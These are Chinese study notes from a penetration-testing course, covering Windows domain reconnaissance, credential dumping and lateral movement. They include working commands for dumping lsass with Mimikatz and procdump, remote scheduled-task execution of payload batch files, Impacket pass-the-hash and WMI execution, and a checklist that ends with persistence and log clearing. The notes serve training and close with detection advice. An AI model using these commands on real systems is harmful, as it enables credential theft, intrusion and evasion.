---
title: XD安全渗透测试课程 Day65-66 学习笔记：域环境基础识别、信息收集体系、凭证获取与初级横向移动
description: 整理 XD安全渗透测试课程 Day65-66 核心内容：域/工作组/局域网环境判断、系统/网络/用户/凭证四维信息收集、域控架构探针，以及基于
  at、schtasks、impacket (atexec/smbexec/wmiexec) 的明文/哈希传递横向移动实战流程。
category: program-analysis
tags:
- XD安全
- 渗透测试
- 内网渗透
- 域环境
- 信息收集
- 凭证获取
- 横向移动
- at
- schtasks
- impacket
- 学习笔记
date: '2024-01-15'
updated: '2026-11-15'
---
## 概述

本页面整理自 **XD安全渗透测试课程** 第 65-66 天（及部分第 67 天）学习笔记，聚焦 **域环境基础识别**、**全维度信息收集**、**凭证获取技术** 与 **初级横向移动手法**。内容覆盖从「判断是否处于域环境」到「利用计划任务、SMB、WMI 实现凭证复用横向移动」的完整实战链路，适合内网渗透入门与 OSCP 风格实战巩固。

> 课程完整大纲与资源索引见 [[xd-security-pentest-course-curriculum]]；后续 Day67-68、Day69-70、Day71-72 进阶内容分别记录于 [[xd-security-internal-network-penetration-notes-day67-68]]、[[xd-security-internal-network-penetration-notes-day69-70]]、[[xd-security-internal-network-penetration-notes-day71-72]]。

---

## Day65：域环境基础识别与四维信息收集

### 环境角色判断：域 vs 工作组

| 指标 | 域环境特征 | 工作组特征 |
|------|------------|------------|
| `systeminfo` / `ipconfig /all` | DNS 后缀指向域名（如 `god.org`），存在域控制器记录 | 无域 DNS 后缀，无 DC 记录 |
| `net view /domain` | 返回域列表 | 报错或空 |
| 计算机名解析 | `ping <DC名>` 可解析到域控 IP | 仅本地解析 |

**关键命令**
```cmd
systeminfo
ipconfig /all
net view /domain
ping <域控主机名>
```

### 系统信息收集

| 目标 | 命令 | 说明 |
|------|------|------|
| 详细系统信息 | `systeminfo` | 补丁、版本、启动时间等 |
| 运行服务 | `net start` | 识别关键服务（如 MSSQL、Exchange） |
| 进程列表 | `tasklist` / `wmic process list brief` | 寻找杀软、EDR、数据库进程 |
| 计划任务 | `schtasks /query /fo LIST /v` | 发现可利用的定时任务 |
| 网络连接/端口 | `netstat -ano` | 确立出站/入站规则、高危端口 |

### 网络拓扑收集

- **DNS 指向**：`nslookup <域名>` 定位域控 IP
- **网段探测**：
  - 内置命令：`for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL="`
  - 第三方：`nbtscan`、`nmap`、`masscan`、Nishang/Empire PowerShell 模块
  - ⚠️ 第三方工具易触发 AV/EDR，实战首选原生命令或免杀脚本

### 用户与组枚举

| 范围 | 命令 | 核心关注 |
|------|------|----------|
| 当前权限 | `whoami /all` | 权限标签、组成员 |
| 登录会话 | `net config workstation` | 登录域/用户 |
| 本地用户/组 | `net user` / `net localgroup` | 本地管理员、特权用户 |
| **域用户/组** | `net user /domain` / `net group /domain` | 全域用户清单 |
| 域管账户 | `net group "Domain Admins" /domain` | 高价值目标 |
| 企业管账户 | `net group "Enterprise Admins" /domain` | 林级最高权限 |
| 域控列表 | `net group "Domain Controllers" /domain` | 横向跳板 |
| 详细属性 | `wmic useraccount get /all` | 最后登录、密码过期等 |

> 💡 **权限边界**：域用户（如 `GOD\webadmin`）无法直接在 DC 执行管理操作；需切换至本地管理员（`WEBSERVER\administrator`）或获取域管凭证。

### 凭证信息收集

| 类型 | 工具/技术 | 适用系统 | 备注 |
|------|-----------|----------|------|
| 系统内存凭证（明文/Hash） | **Mimikatz** (Windows) / **Mimipenguin** (Linux) | Win 全版本、Linux 部分 | 需 SYSTEM/管理员权限；Win 2012+ 默认关闭 WDigest |
| 协议/服务凭证 | **LaZagne**（全平台） / **XenArmor** (Win) | 全平台 | 浏览器、WiFi、FTP、VPN、邮箱等 |
| 站点/数据库备份 | 手工搜集 | - | 源码备份、SQL Dump、配置文件 |
| 浏览器凭证 | 手工/脚本导出 | - | Chrome/Firefox/Edge 登录数据 |
| 会话残留 | 3389/IPC$ 连接记录、回收站 | - | 可能泄露明文或 NTDS.dit 碎片 |

**Mimikatz 典型流程**
```cmd
privilege::debug
sekurlsa::logonpasswords
```
若上传被杀，可用 **Procdump + Mimikatz** 离线提取：
```cmd
# 目标主机
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 攻击机
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" exit
```
详细原理见 [[mimikatz-source-code-architecture-golden-ticket-audit]]；Hash 生成算法见 [[lm-ntlm-hash-generation-analysis]]。

### 域控架构探针

| 目标 | 技术/命令 |
|------|-----------|
| 域控主机名/时间 | `net time /domain`、`nslookup <域名>` |
| 存活主机扫描 | `nbtscan`、原生 `for` 循环 ping、Nishang `Scan-Port`、`Invoke-ARPScan` |
| 服务枚举 | Nishang `Get-Information`、PowerView `Invoke-ShareFinder` 等 |

> ⚠️ **OPSEC**：批量扫描易触发 NIDS/HIDS；建议低频、分时段、配合 [[internal-network-pivoting-techniques]] 中的隧道技术隐匿流量。

---

## Day66：初级横向移动——at / schtasks / Impacket 套件

### 攻击前提

- 已控制一台域内主机（WebServer/Workstation）
- 通过 Mimikatz/LaZagne 获取 **明文密码** 或 **NTLM Hash**
- 结合 Day65 收集的 **域用户字典** + **密码字典** 进行喷射/爆破
- 目标开放 **445 (SMB)** / **135 (RPC/WMI)** / **139 (NetBIOS)**

### 基于计划任务的横向移动（明文密码）

#### at（Windows Server 2012 之前）
```cmd
net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator
copy add.bat \\192.168.3.21\c$
at \\192.168.3.21 15:47 c:\add.bat
```
> `add.bat` 通常为 CS/MSF 反弹载荷或添加用户命令。

#### schtasks（Windows Server 2012 及以上）
```cmd
net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator
copy add.bat \\192.168.3.32\c$
schtasks /create /s 192.168.3.32 /ru "SYSTEM" /tn adduser /sc DAILY /tr c:\add.bat /F
schtasks /run /s 192.168.3.32 /tn adduser /i
schtasks /delete /s 192.168.3.32 /tn adduser /f
```
- `/ru "SYSTEM"` 以 SYSTEM 权限执行
- `/sc DAILY` 每日触发，配合 `/run` 立即执行
- 执行后务必 `/delete` 清理痕迹

### Impacket 套件：支持 Hash 传递的横向利用

| 模块 | 协议/端口 | 认证方式 | 回显 | 典型命令 |
|------|-----------|----------|------|----------|
| **atexec.py** | SMB/445 (Task Scheduler) | 明文/Hash | 有 | `atexec.py -hashes :<NTLM> admin@192.168.3.32 "whoami"` |
| **smbexec.py** | SMB/445 (服务注册) | 明文/Hash | 半交互 | `smbexec.py -hashes :<NTLM> admin@192.168.3.32` |
| **wmiexec.py** | DCOM/RPC/135 (WMI) | 明文/Hash | 有 | `wmiexec.py -hashes :<NTLM> admin@192.168.3.32` |
| **psexec.py** | SMB/445 (服务安装) | 明文/Hash | 有 | `psexec.py -hashes :<NTLM> admin@192.168.3.32` |

> **优势**：原生支持 **Pass-the-Hash**，无需明文；**缺点**：Python 脚本体积大、特征明显，需免杀（PyInstaller 打包 + 混淆）或使用 [[cobalt-strike-external-c2-smb-beacon]] 等框架内置模块。

### 批量化实战脚本化思路

1. **存活 IP 列表** → `ips.txt`
2. **用户名字典** → `users.txt`（域用户枚举结果）
3. **密码/Hash 字典** → `pass.txt` / `hashes.txt`
4. 多线程/协程并发尝试 `net use` / `smbexec.py` / `wmiexec.py`
5. 成功即写入会话、上传载荷、建立持久化

> 示例 Python 伪代码见原文；实战建议使用 **CrackMapExec**、**Ladon**、**SharpHound** 等成熟工具，或结合 [[cobalt-strike-external-c2-smb-beacon]] 的 `jump psexec`/`jump winrm` 模块。

---

## Day67 补充：SMB/WMI 深度横向与凭证补全技术

> 完整 Day67-68 内容见 [[xd-security-internal-network-penetration-notes-day67-68]]，此处仅摘录核心补充点。

### Win 2012+ 明文获取受限的四大对策

| 策略 | 核心手段 | 参考页面 |
|------|----------|----------|
| **Pass-the-Hash / Pass-the-Key / Pass-the-Ticket** | 直接复用 NTLM Hash / AES Key / Kerberos Ticket | [[xd-security-internal-network-penetration-notes-day67-68]] |
| **协议转发利用** | SMB (psexec/smbexec)、WMI (wmiexec)、WinRM、RDP | [[named-pipe-smb-detection-sysmon]]、[[internal-network-pivoting-techniques]] |
| **注册表开启 WDigest** | `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 1` 重启 lsass | 需重启/注销触发 |
| **离线破解** | Hashcat 字典/掩码/规则破解 NTLM Hash | [[lm-ntlm-hash-generation-analysis]] |

### Procdump + Mimikatz 离线凭证导出

```cmd
# 目标主机（官方签名，极难被杀）
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 攻击机
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" exit
```

### SMB 服务横向移动对比

| 工具 | 依赖 IPC$ | 认证方式 | 回显 | 留痕 |
|------|-----------|----------|------|------|
| **Sysinternals PsExec** | 需预建立 | 仅明文 | 有 | 高（服务安装 Event 7045） |
| **Impacket psexec.py** | 无需预建 | 明文/Hash | 有 | 高 |
| **Impacket smbexec.py** | 无需预建 | 明文/Hash | 半交互 | 中（临时服务） |
| **Cobalt Strike `jump psexec`** | 无需预建 | 明文/Hash | Beacon 会话 | 可配置 Malleable Profile 隐匿 |

详细检测规则见 [[named-pipe-smb-detection-sysmon]]（Sysmon Event ID 17/18 管道监控）。

### WMI 横向移动对比

| 方式 | 端口 | 认证 | 回显 | 留痕 | 典型命令 |
|------|------|------|------|------|----------|
| **wmic** | 135 (DCOM/RPC) | 仅明文 | 无 | 低 | `wmic /node:192.168.3.32 /user:admin /password:pwd process call create "cmd /c whoami > c:\1.txt"` |
| **wmiexec.vbs / wmiexec.py** | 135 | 明文/Hash | 有 | 低 | `wmiexec.py -hashes :<NTLM> admin@192.168.3.32` |
| **Cobalt Strike `jump wmi`** | 135 | 明文/Hash | Beacon 会话 | 可配置 | `jump wmi 192.168.3.32 admin :<NTLM>` |

> **WMI 优势**：无文件落地、日志极少（仅 WinRM/Operational 日志记录 `__EventFilter`/`CommandLineEventConsumer`），是红队首选横向通道之一。

---

## 交叉引用速查表

| 主题 | 页面 |
|------|------|
| 课程大纲与资源总索引 | [[xd-security-pentest-course-curriculum]] |
| Day67-68：PTH/PTK/PTT、黄金/白银票据、Kerberoasting | [[xd-security-internal-network-penetration-notes-day67-68]] |
| Day69-70：Cobalt Strike 实战、SPN 扫描、SOCKS 代理、Frp/Ngrok 隧道 | [[xd-security-internal-network-penetration-notes-day69-70]] |
| Day71-72：ICMP/DNS/端口转发隧道、CS↔MSF 会话移交、应急响应溯源 | [[xd-security-internal-network-penetration-notes-day71-72]] |
| Mimikatz 架构与黄金票据源码分析 | [[mimikatz-source-code-architecture-golden-ticket-audit]] |
| LM/NTLM Hash 生成算法深度解析 | [[lm-ntlm-hash-generation-analysis]] |
| 内网穿透/横向移动技术全景 | [[internal-network-pivoting-techniques]] |
| Cobalt Strike SMB Beacon 与 External C2 | [[cobalt-strike-external-c2-smb-beacon]] |
| SMB 命名管道检测与 Sysmon 规则 | [[named-pipe-smb-detection-sysmon]] |
| 基础阶段（Day1-24）Web/SQL/上传笔记 | [[xd-security-pentest-basic-stage-notes]] |
| 提权阶段笔记 | [[xd-security-pentest-privilege-escalation-notes]] |

---

## 实战清单

1. **环境确认** → `systeminfo` / `ipconfig /all` / `net view /domain`
2. **四维收集** → 系统/网络/用户/凭证（Day65 核心命令表）
3. **凭证固化** → Mimikatz/Procdump/LaZagne → 明文 + NTLM Hash + Ticket
4. **目标画像** → 存活主机 + 开放端口（445/135/139/3389/5985）+ 高价值账户
5. **横向尝试顺序**：
   - 明文 → `schtasks` / `wmiexec.py` / `atexec.py`
   - Hash → `smbexec.py` / `wmiexec.py` / `psexec.py` / CS `jump psexec|wmi`
   - Ticket → PTT + `wmiexec.py -k` / CS `pth` + `jump`
6. **会话建立** → 上传 CS Beacon / MSF Meterpreter / 自定义 Loader
7. **权限提升** → 本地提权 / 域提权（MS14-068 / Delegation / Kerberoasting）
8. **持久化与隐匿** → SID History / Skeleton Key / Golden Ticket / SSP / WMI Event Subscription
9. **清理痕迹** → 清理 Event Log、删除计划任务/服务、抹除上传文件、Timestomp

---

## 防御视角建议

| 检测层面 | 关键指标 | 参考 |
|----------|----------|------|
| **主机** | Event 4624 (Logon Type 3/10)、7045 (服务安装)、4698/4702 (计划任务创建/修改)、Sysmon 17/18 (管道创建/连接) | [[named-pipe-smb-detection-sysmon]] |
| **网络** | SMB 会话异常（高频 IPC$、管道命名规律）、RPC/DCOM 畸形调用、Kerberos AS-REQ/TGS-REQ 异常 | [[cobalt-strike-external-c2-smb-beacon]] |
| **身份** | 单账户多源 IP 登录、Hash 重放特征（无预认证）、黄金票据特征（任意 PAC、长周期） | [[mimikatz-source-code-architecture-golden-ticket-audit]] |
| **缓解** | 禁用 WDigest、强制 Kerberos AES、限制 NTLM、启用 Credential Guard、分层管理账户、部署 HFish 蜜罐 | [[xd-security-blue-team-defense]] |

---

> 页面持续更新中，后续将补充 **Day67-68 凭证复用进阶**、**Day69-70 C2 实战与隧道**、**Day71-72 应急响应溯源** 等内容的深度交叉引用与实战复盘。

## 来源

- [0x00实验室-202108-202304_107](../sources/0x00实验室-202108-202304_107.md)
